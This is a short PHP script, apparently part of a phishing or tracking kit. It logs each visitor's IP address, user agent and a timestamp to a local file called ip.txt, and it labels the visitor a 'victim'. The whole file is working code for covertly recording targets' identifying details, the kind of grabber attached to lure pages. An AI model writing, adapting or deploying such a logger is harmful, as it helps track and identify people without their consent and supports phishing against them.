<?php

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$useragent = "User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];


$file = 'ip.txt';
$victim = "IP: ";
$date = date('dMYHis');
$dev = "Developer : Mukesh Mahato\r\n";
$fp = fopen($file, 'a');

fwrite($fp, $dev);
fwrite($fp, $victim);
fwrite($fp, $ipaddress);
fwrite($fp, $useragent);
fwrite($fp, $browser);
fwrite($fp, $date);

fclose($fp);
